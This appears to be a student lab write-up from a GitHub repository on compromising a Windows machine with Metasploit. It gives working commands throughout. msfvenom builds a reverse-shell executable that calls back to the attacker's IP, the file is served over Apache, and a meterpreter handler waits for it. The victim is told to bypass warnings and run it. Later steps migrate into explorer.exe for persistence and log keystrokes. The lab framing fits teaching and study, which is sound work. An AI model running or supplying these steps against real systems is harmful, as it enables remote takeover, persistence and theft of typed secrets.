
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/09d09be2-6084-4db9-a066-fd34c1a29e74)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/1a87b87e-812f-457f-be8c-52f43d14548e)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/bfc40087-91be-4cbf-9e7a-09221b6a0e88)

Start apache server
sudo systemctl apache2 start

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/fdf42e7a-e11b-4f32-a4e4-0dc1f3274c8b)

Check the status of apache2

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/81301d0b-a221-47de-8c3e-905f5e6f6c71)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/3c9e1ea3-0cfd-42ba-a8aa-85519f13e32a)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/1b0c0300-a2d7-4da0-ab04-841e1e172292)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/bd146aa9-77b5-4ee1-8b2f-9191170cfa28)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/1b01b9a2-e093-4c5a-a58e-e5901a270dcf)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/2a635d49-41b0-40a6-8912-88556e66c494)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/3b4c87bd-345f-4f35-aa50-086dbb2a7b3a)
keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/danush564/Compromising-windows-using-Metasploit/assets/98585166/36306d31-61cd-42bb-9d47-ba93c1234909)






## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
